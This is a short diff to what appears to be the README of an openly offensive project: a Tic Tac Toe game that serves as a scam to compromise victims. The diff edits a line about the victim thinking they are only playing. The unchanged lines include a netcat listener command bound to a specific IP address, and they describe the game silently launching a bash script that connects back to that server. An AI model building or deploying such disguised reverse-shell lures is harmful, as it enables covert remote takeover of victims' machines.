@@ -16,7 +16,7 @@ Scam attack that uses Tic tac toe game to catch victims
    $ nc -lnvp 2004 -s 82.165.97.169
 ```
 
-The victim downloads the motivation videos expecting to watch all the motivation videos.
+The victim thinks that he/she is just playing a game.
 
 When the victim opens up the game, a thread is created the in the background to run a bash script that connects to the server hence the victim is hacked.
 
